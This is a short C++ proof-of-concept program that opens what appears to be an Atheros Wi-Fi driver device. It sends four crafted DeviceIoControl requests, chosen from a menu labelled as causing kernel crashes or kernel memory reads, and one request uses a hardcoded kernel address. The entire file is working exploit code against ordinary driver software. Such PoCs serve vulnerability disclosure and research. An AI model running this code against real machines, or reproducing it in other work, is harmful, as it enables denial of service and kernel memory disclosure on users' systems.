#include <Windows.h>
#include <iostream>

#define IOCTL_EVENT_OBJECT 0x220203
#define IOCTL_SET_POWER_LIMIT 0x22020B
#define IOCTL_GET_PCI_DATA 0x220043 
#define IOCTL_PPDULOG_CMD 0x220207

int main()
{
	HANDLE hWifiDrv = CreateFile(L"\\\\.\\ATH_WIFIDEV.00", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, 0, NULL);
	int option = 0;
	DWORD returned;
	BYTE input[0x1000] = {0xc, 0x0, 0x14, 0x4, 0x0, 0x0}, output[0x1000] = {};
 	std::cout << "Enter an option" << std::endl;
	std::cout << "1) IOCTL_EVENT_OBJECT Crash" << std::endl;
	std::cout << "2) IOCTL_SET_POWER_LIMIT Crash/Kernel Memory Read" << std::endl;
	std::cout << "3) IOCTL_PPDULOG_CMD Crash" << std::endl;
	std::cout << "4) IOCTL_GET_PCI_DATA Crash/Kernel Memory Read" << std::endl <<">";

	std::cin >> option;
	switch (option) {
	case 1:
		DeviceIoControl(hWifiDrv, IOCTL_EVENT_OBJECT, NULL, 0x4, output, 0x4, &returned, NULL);
		break;
	case 2:
		DeviceIoControl(hWifiDrv, IOCTL_SET_POWER_LIMIT, NULL, 0x4, output, 0x4, &returned, NULL);
		break;
	case 3:
		DeviceIoControl(hWifiDrv, IOCTL_PPDULOG_CMD, NULL, 0x4, NULL, 0x0, &returned, NULL);
		break;
	case 4:
		DeviceIoControl(hWifiDrv, IOCTL_GET_PCI_DATA, (void*)0xffffff777700993, 0x50, output, 0x100, &returned, NULL);
		break;
	}
	
}